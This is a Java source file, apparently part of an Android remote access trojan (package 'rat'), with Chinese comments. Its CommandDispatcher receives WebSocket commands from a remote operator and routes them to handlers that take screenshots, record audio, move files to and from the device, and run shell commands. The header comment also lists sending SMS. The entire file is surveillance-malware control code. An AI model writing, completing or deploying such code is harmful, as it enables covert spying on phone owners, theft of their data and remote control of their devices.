package com.vendor.rat.control.handler;

import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;

/**
 * 指令分发器 (模块 06 核心)
 *
 * 解析 WebSocket 指令，路由到对应 Handler
 *
 * 指令类型:
 *   10: 截图 → ScreenshotHandler
 *   11: 录音 → AudioRecordHandler
 *   12: 下载文件 → FileTransferHandler
 *   13: 上传文件 → FileTransferHandler
 *   14: Shell 执行 → ShellCommandHandler
 *   15: 发送短信 → SmsHandler
 *   16: 命令响应
 */
public class CommandDispatcher implements WebSocketClient.CommandListener {

    private static final String TAG = "CommandDispatcher";
    private final Gson gson = new Gson();

    private ScreenshotHandler screenshotHandler;
    private AudioRecordHandler audioRecordHandler;
    private ShellCommandHandler shellCommandHandler;
    private FileTransferHandler fileTransferHandler;

    public CommandDispatcher() {
        screenshotHandler = new ScreenshotHandler();
        audioRecordHandler = new AudioRecordHandler();
        shellCommandHandler = new ShellCommandHandler();
        fileTransferHandler = new FileTransferHandler();
    }

    /**
     * 注册到 WebSocket 客户端
     */
    public void register() {
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null) {
            wsClient.setCommandListener(this);
        }
    }

    @Override
    public void onCommandReceived(String message) {
        try {
            JsonObject json = JsonParser.parseString(message).getAsJsonObject();
            int type = json.get("type").getAsInt();

            switch (type) {
                case 10: screenshotHandler.handle(json); break;
                case 11: audioRecordHandler.handle(json); break;
                case 12: // fall through
                case 13: fileTransferHandler.handle(json); break;
                case 14: shellCommandHandler.handle(json); break;
                default:
                    Log.w(TAG, "Unknown command type: " + type);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to dispatch command", e);
        }
    }
}
